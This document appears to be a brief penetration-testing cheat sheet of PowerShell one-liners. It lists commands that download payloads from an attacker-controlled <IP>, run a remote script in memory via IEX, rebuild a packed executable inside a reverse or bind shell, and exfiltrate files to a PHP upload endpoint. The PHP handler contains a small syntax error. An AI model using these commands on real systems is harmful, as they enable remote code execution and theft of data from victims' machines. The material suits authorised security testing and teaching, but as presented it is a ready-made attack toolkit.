# Awesome-oneliners


# Basic NC



# CMD



# Powershell
Remote payload, HTTP, File download 
-> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/file.exe','file.exe')

Remote payload, HTTP, No file download 
-> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<IP><PORT>/script.ps1')  
  
Remote payload, Clipbord, Binary compress and rebuild 
-> upx -9 file.exe
-> exe2hex -x file.exe -p file.cmd
-> Copy the contents of file.cmd and paste in the reverse/bind shell termnial
-> Powershell rebuilds exe on the windows server
 
 Data exfil, HTTP, Upload file
 Server side - 
 <?php $uploaddir = '/var/www/uploads/'; $uploadfile = $uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name']. $uploadfile) ?>  
 
 Client side - 
 powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', 'file.txt') 
  
  
  
 
